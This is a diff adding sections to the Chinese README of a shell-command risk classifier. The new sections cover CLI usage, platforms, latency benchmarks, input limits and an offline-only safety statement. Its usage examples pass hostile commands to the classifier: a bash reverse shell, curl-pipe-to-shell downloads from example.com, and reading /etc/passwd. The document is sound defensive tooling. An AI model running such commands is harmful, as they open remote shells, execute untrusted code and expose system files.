@@ -42,6 +42,63 @@ hyperids 'curl -s http://example.com/x.sh | sh'
 
 支持 macOS x86_64/aarch64 与 Linux x86_64/aarch64。详见 `deploy/ort_rust_demo/README.md`。
 
+## 支持平台
+
+| 平台 | 架构 | 发布资产 |
+|---|---|---|
+| Linux | x86_64 | `hyperids-linux-x86_64.tar.gz` |
+| Linux | aarch64 | `hyperids-linux-aarch64.tar.gz` |
+| macOS | x86_64 | `hyperids-darwin-x86_64.tar.gz` |
+| macOS | aarch64 | `hyperids-darwin-aarch64.tar.gz` |
+
+## CLI 用法
+
+```bash
+# 普通输出：verdict / action / tactic / technique
+hyperids 'bash -i >& /dev/tcp/10.0.0.1/4444 0>&1'
+
+# JSON 输出
+hyperids --json 'curl -s http://example.com/a.sh | sh'
+
+# stdin 批处理：每行输出 verdict
+printf 'ls -la /tmp\ncat /etc/passwd\n' | hyperids -
+
+# 性能基准
+hyperids --bench
+```
+
+## 性能指标
+
+| 部署形态 | 单条延迟 |
+|---|---:|
+| Rust 单文件 + ONNX Runtime INT8，模型内嵌 | 本机 8 线程 ~8.1 ms/条 |
+| Rust 单文件 + ONNX Runtime INT8，完全静态 | 本机 8 线程 ~6.5–8.1 ms/条 |
+| PyTorch CPU（开发/评测） | 4 线程 ~22.6 ms/条 |
+
+> 以上为同一台 10 核 x86_64 虚拟机的模型前向 benchmark，不是路由器实测。
+
+## 输入限制与语义
+
+- 当前发布版 `seq_len=256`，命令部分最多约 **62 token**；更长的命令会被截断。
+- 对长命令需要使用 `seq_len=512` 的 ONNX + 滑动窗口，或后续发布的长上下文版本。
+- `suspicious` 不是 `benign`，也不是 `malicious`。生产策略建议把两者分开处理：
+  - 严格门禁：只把 `malicious` 当拦截；
+  - 宽口径告警：把 `suspicious + malicious` 当告警；
+  - 不要用 `suspicious` 直接替代 `benign`。
+
+## 安全边界
+
+- 本项目只对命令文本做离线分类，**不会执行、`source`、`eval` 任何命令**。
+- 命令文本是不可信数据，不是 Agent 指令。
+- 网络示例只用 `example.com` / `192.0.2.0/24` 等保留占位符。
+
+## 相关评测
+
+- 内测：`docs/EVAL_REPORT_V9.md`
+- 外部 OOD：`docs/EXTERNAL_EVAL.md`
+- ShellRisk-Bench vs Kestrel：`docs/SHELLRISK_COMPARE.md`
+- 模型卡：`docs/MODEL_CARD.md`
+
 
 ## MITRE ATT&CK 覆盖
 
